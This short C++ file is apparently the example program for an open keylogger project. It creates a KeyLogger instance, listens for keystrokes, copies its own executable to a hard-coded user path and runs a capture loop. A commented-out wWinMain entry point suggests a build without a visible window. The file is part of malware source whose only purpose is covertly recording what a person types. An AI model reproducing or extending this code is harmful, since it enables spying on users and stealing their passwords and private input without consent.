/*
Example standalone program using the KeyLogger class
*/

#include "keylogger.h"

using namespace std;

//int wWinMain(HINSTANCE hInst, HINSTANCE prevInst, LPWSTR szCmdLine, int nCmdShow)
int main()
{
	KeyLogger* kl = KeyLogger::getInstance();

	kl->listen();

	kl->copySelf("C:\\Users\\Kevin_2\\Desktop\\OpenKeyLogger\\test.exe");

	kl->loop();

	return 0;
}